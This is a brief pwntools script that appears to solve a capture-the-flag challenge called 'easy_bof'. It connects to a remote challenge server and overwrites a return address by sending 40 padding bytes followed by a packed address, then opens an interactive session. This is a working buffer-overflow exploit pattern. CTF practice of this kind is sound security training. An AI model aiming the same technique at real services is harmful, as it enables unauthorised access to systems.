from pwn import *

elf = ELF('./easy_bof')
io = remote('chall1.iwashiira.com', 30001)
# io = process('./easy_bof')
io.sendline('a' * 40 + p64(0x4005e8))
io.interactive()
